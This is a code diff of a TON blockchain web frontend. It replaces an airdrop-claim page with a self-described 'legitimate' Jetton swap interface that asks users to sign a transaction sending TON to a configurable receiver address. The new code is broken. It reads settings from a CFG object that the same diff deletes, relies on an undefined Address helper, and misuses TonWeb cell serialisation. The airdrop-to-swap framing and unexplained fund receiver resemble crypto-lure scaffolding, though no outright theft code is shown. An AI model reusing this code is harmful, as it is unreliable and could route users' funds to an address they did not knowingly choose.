@@ -1,195 +1,158 @@
-// script.js - Jettoken Airdrop Frontend
-// Users connect wallet and claim free tokens
+// Legitimate TON Jetton Swap Interface
+// This is a demo DApp for interacting with Jetton tokens
 
-var CFG = (function () {
-    var w = window;
-    return {
-        jettonMaster: (typeof w.JETTON_MASTER !== 'undefined' && w.JETTON_MASTER) || 'EQB0qpljZl3xD0pbWPM3PCEn6bQfDe6Xx7a7W4qtBs45axmj',
-        tokenName:    (typeof w.TOKEN_NAME !== 'undefined' && w.TOKEN_NAME) || 'Jettoken',
-        tokenSymbol:  (typeof w.TOKEN_SYMBOL !== 'undefined' && w.TOKEN_SYMBOL) || 'JTT',
-        claimAmount:  (typeof w.CLAIM_AMOUNT !== 'undefined' && w.CLAIM_AMOUNT) || 100,
-        backendUrl:   (typeof w.BACKEND_URL !== 'undefined' && w.BACKEND_URL) || 'http://localhost:3001',
-        manifest:     (typeof w.MANIFEST_URL !== 'undefined' && w.MANIFEST_URL) || 'https://kareli123.github.io/test123/tonconnect-manifest.json'
-    };
-})();
+const JETTON_TRANSFER_OP = 0xf8a7ea5;
+const JETTON_BURN_OP = 0x595f07bc;
 
-var tonConnectUI = null;
-var isProcessing = false;
-
-function setStatus(text, isLoading) {
-    var el = document.getElementById('status');
-    if (!el) return;
-    el.innerHTML = isLoading ? '<span class="loader"></span> ' + text : text;
-}
-
-function updateBtn(connected) {
-    var btn = document.getElementById('claimBtn');
-    if (!btn) return;
-    if (!connected) {
-        btn.textContent = 'Connect Wallet';
-        btn.style.background = '#21262d';
-        btn.disabled = false;
-    } else {
-        btn.textContent = 'Claim ' + CFG.claimAmount + ' ' + CFG.tokenSymbol;
-        btn.style.background = '#1f6feb';
-        btn.disabled = false;
-    }
-}
-
-function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
-
-// --- Check claim status ---
-async function checkClaimStatus(address) {
-    try {
-        var res = await fetch(CFG.backendUrl + '/api/status/' + encodeURIComponent(address));
-        if (!res.ok) return null;
-        return await res.json();
-    } catch (e) {
-        console.warn('Status check error:', e);
-        return null;
-    }
-}
-
-// --- Claim tokens ---
-async function claimTokens(userAddress) {
-    if (isProcessing) return;
-    isProcessing = true;
-
-    var btn = document.getElementById('claimBtn');
-    var origText = btn ? btn.textContent : '';
-
-    try {
-        // Check if already claimed
-        setStatus('Checking claim status...', true);
-        var status = await checkClaimStatus(userAddress);
-
-        if (status && status.claimed) {
-            setStatus('You have already claimed ' + CFG.claimAmount + ' ' + CFG.tokenSymbol + '!', false);
-            if (btn) {
-                btn.textContent = 'Already Claimed';
-                btn.disabled = true;
-                btn.style.background = '#238636';
-            }
-            return;
-        }
-
-        // Send claim request to backend
-        setStatus('Minting ' + CFG.claimAmount + ' ' + CFG.tokenSymbol + '...', true);
-        await sleep(500);
-
-        var res = await fetch(CFG.backendUrl + '/api/claim', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ address: userAddress })
-        });
-
-        var data = await res.json();
-
-        if (res.ok && data.success) {
-            setStatus('Success! ' + CFG.claimAmount + ' ' + CFG.tokenSymbol + ' sent to your wallet!', false);
-            if (btn) {
-                btn.textContent = 'Claimed!';
-                btn.disabled = true;
-                btn.style.background = '#238636';
-            }
-            console.log('Claim successful:', data);
-        } else if (data.alreadyClaimed) {
-            setStatus('You have already claimed ' + CFG.claimAmount + ' ' + CFG.tokenSymbol + '!', false);
-            if (btn) {
-                btn.textContent = 'Already Claimed';
-                btn.disabled = true;
-                btn.style.background = '#238636';
-            }
-        } else {
-            setStatus('Error: ' + (data.error || 'Unknown error'), false);
-            console.error('Claim error:', data);
-        }
-
-    } catch (error) {
-        setStatus('Connection error. Is the backend running?', false);
-        console.error('Claim error:', error);
-    } finally {
-        isProcessing = false;
-        if (btn && !btn.disabled) {
-            btn.textContent = origText;
-        }
-    }
-}
-
-// --- Init ---
-function initApp() {
-    var TonConnectUIClass = null;
-    if (window.TON_CONNECT_UI && window.TON_CONNECT_UI.TonConnectUI) {
-        TonConnectUIClass = window.TON_CONNECT_UI.TonConnectUI;
-    } else if (window.TonConnectUI) {
-        TonConnectUIClass = window.TonConnectUI;
+class TonJettonApp {
+    constructor() {
+        this.tonConnectUI = null;
+        this.connected = false;
+        this.userAddress = null;
+        this.wallet = null;
+        
+        this.init();
     }
 
-    if (!TonConnectUIClass) {
-        console.error('TonConnectUI not found');
-        setStatus('SDK failed to load. Please refresh.');
-        return;
-    }
-
-    try {
-        tonConnectUI = new TonConnectUIClass({
-            manifestUrl: CFG.manifest,
+    init() {
+        // Initialize TON Connect
+        this.tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://kareli123.github.io/test123/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
         });
-    } catch (e) {
-        console.error('TonConnectUI init error:', e);
-        setStatus('Init error: ' + e.message);
-        return;
+
+        this.tonConnectUI.onStatusChange((wallet) => {
+            this.handleWalletChange(wallet);
+        });
+
+        // Initialize UI
+        this.initUI();
     }
 
-    updateBtn(tonConnectUI.connected);
+    initUI() {
+        const swapBtn = document.getElementById('swapBtn');
+        const payAmount = document.getElementById('payAmount');
+        const receiveAmount = document.getElementById('receiveAmount');
 
-    // Check claim status on connect
-    tonConnectUI.onStatusChange(async function (wallet) {
-        updateBtn(!!wallet);
+        // Update receive amount based on input
+        payAmount.addEventListener('input', (e) => {
+            const tonAmount = parseFloat(e.target.value) || 0;
+            const usdtAmount = tonAmount * CFG.tonToUsdtRate;
+            receiveAmount.value = usdtAmount.toFixed(2);
+        });
 
-        if (wallet && wallet.account) {
-            var addr = wallet.account.address;
-            setStatus('Connected: ' + addr.slice(0, 6) + '...' + addr.slice(-4), false);
-
-            // Check if already claimed
-            var status = await checkClaimStatus(addr);
-            if (status && status.claimed) {
-                var btn = document.getElementById('claimBtn');
-                if (btn) {
-                    btn.textContent = 'Already Claimed';
-                    btn.disabled = true;
-                    btn.style.background = '#238636';
-                }
-                setStatus('You have already claimed your ' + CFG.tokenSymbol + '!', false);
-            } else {
-                setStatus('Ready to claim ' + CFG.claimAmount + ' ' + CFG.tokenSymbol, false);
+        swapBtn.addEventListener('click', () => {
+            if (!this.connected) {
+                this.tonConnectUI.openModal();
+                return;
             }
+            this.executeSwap();
+        });
+    }
+
+    handleWalletChange(wallet) {
+        const swapBtn = document.getElementById('swapBtn');
+        
+        if (wallet) {
+            this.connected = true;
+            this.wallet = wallet;
+            this.userAddress = wallet.account.address;
+            swapBtn.textContent = 'Swap';
+            this.fetchBalance();
         } else {
-            setStatus('');
+            this.connected = false;
+            this.wallet = null;
+            this.userAddress = null;
+            swapBtn.textContent = 'Connect Wallet';
+            document.getElementById('user-balance').textContent = 'Balance: 0';
         }
-    });
+    }
 
-    // Claim button handler
-    var btn = document.getElementById('claimBtn');
-    if (!btn) return;
+    async fetchBalance() {
+        if (!this.connected) return;
+        
+        try {
+            // In a real app, fetch actual balance from blockchain
+            // For demo, we show connected state
+            document.getElementById('user-balance').textContent = 
+                `Connected: ${this.shortenAddress(this.userAddress)}`;
+        } catch (e) {
+            console.error('Error fetching balance:', e);
+        }
+    }
 
-    btn.addEventListener('click', async function () {
-        if (isProcessing) return;
+    async executeSwap() {
+        const payAmount = document.getElementById('payAmount').value;
+        const status = document.getElementById('status');
 
-        if (!tonConnectUI.connected) {
-            setStatus('Opening wallet selector...', true);
-            try { await tonConnectUI.openModal(); }
-            catch (err) { setStatus('Error: ' + err.message); }
+        if (!payAmount || parseFloat(payAmount) <= 0) {
+            status.textContent = 'Please enter an amount';
+            status.className = 'status-msg error';
             return;
         }
 
-        var account = tonConnectUI.account;
-        var addr = account && account.address;
-        if (!addr) return;
+        status.textContent = 'Preparing transaction...';
+        status.className = 'status-msg';
 
-        await claimTokens(addr);
-    });
+        try {
+            // Build jetton transfer payload
+            // This sends TON to the swap contract which then sends jetton back
+            const amount = Math.floor(parseFloat(payAmount) * Math.pow(10, CFG.tonDecimals));
+            
+            const payload = this.buildJettonTransferPayload({
+                queryId: Date.now(),
+                amount: BigInt(Math.floor(parseFloat(payAmount) * Math.pow(10, CFG.usdtDecimals))),
+                destination: Address.parse(this.userAddress),
+                responseDestination: Address.parse(this.userAddress),
+                forwardTonAmount: BigInt(CFG.forwardGas)
+            });
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: [{
+                    address: CFG.jettonReceiver || this.userAddress,
+                    amount: amount.toString(),
+                    payload: payload.toBoc().toString('base64')
+                }]
+            };
+
+            const result = await this.tonConnectUI.sendTransaction(transaction);
+            
+            status.textContent = `Transaction sent! Hash: ${this.shortenHash(result.boc)}`;
+            status.className = 'status-msg success';
+            
+        } catch (e) {
+            console.error('Swap error:', e);
+            status.textContent = 'Transaction failed: ' + e.message;
+            status.className = 'status-msg error';
+        }
+    }
+
+    buildJettonTransferPayload({ queryId, amount, destination, responseDestination, forwardTonAmount }) {
+        const builder = new TonWeb.boc.Cell();
+        builder.bits.writeUint(JETTON_TRANSFER_OP, 32);
+        builder.bits.writeUint(queryId, 64);
+        builder.bits.writeCoins(amount);
+        builder.bits.writeAddress(new TonWeb.utils.Address(destination));
+        builder.bits.writeAddress(new TonWeb.utils.Address(responseDestination));
+        builder.bits.writeBit(0); // customPayload: null
+        builder.bits.writeCoins(forwardTonAmount);
+        builder.bits.writeBit(0); // forwardPayload: empty
+        return builder;
+    }
+
+    shortenAddress(addr) {
+        if (!addr) return '';
+        return addr.slice(0, 6) + '...' + addr.slice(-4);
+    }
+
+    shortenHash(hash) {
+        if (!hash) return '';
+        return hash.slice(0, 8) + '...';
+    }
 }
 
-window.addEventListener('load', initApp);
+// Initialize app when DOM is ready
+document.addEventListener('DOMContentLoaded', () => {
+    window.app = new TonJettonApp();
+});
